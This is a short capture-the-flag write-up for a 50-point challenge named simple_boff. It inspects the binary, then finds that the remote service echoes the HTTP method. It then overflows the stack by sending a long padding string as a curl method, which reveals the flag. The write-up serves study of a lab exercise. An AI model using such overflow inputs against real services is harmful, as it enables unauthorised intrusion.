# simple_boff - 50 points

**[⬆ to writups](../README.md)**

## Data:

- Host: 0.cloud.chals.io
- Port: 21516
- File: [simple_boff](./simple_boff)

## Solution

1.  in command line `$ file simple_boff` >>

```
simple_boff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa169cb00a736577ad4d6561f723d2b6a3c2f8fb, for GNU/Linux 3.2.0, not stripped
```

2.  `$ chmod +x simple_boff; ./simple_boff`
3.  If we typing **something** and hit the Enter we get `Hello, something!`
4.  Open the file in `vim` or `hexeditor`. Search `flag` and get something like `%s^Hello, %s!.r.flag.txt.......Hurry up and try in on server side.`
5.  Adress [http://0.cloud.chals.io:21516](http://0.cloud.chals.io:21516/) not opened in Browser
6.  `curl http://0.cloud.chals.io:21516/` gets us `Hello, GET!`
7.  Let's try something like `curl -X something http://0.cloud.chals.io:21516`
8.  We get `Hello, something!`. Nice.
9.  Now we can try to do stack overflow attack.
    ```
    curl -X givemetheflag_111111112222222233333333444444445555555566666666aaaaaaaaaaaaaabbbbbbbbb http://0.cloud.chals.io:21516
    ```

We get the flag: **flag{w45_17_d1ff1cul7?\_b0fffffff}**
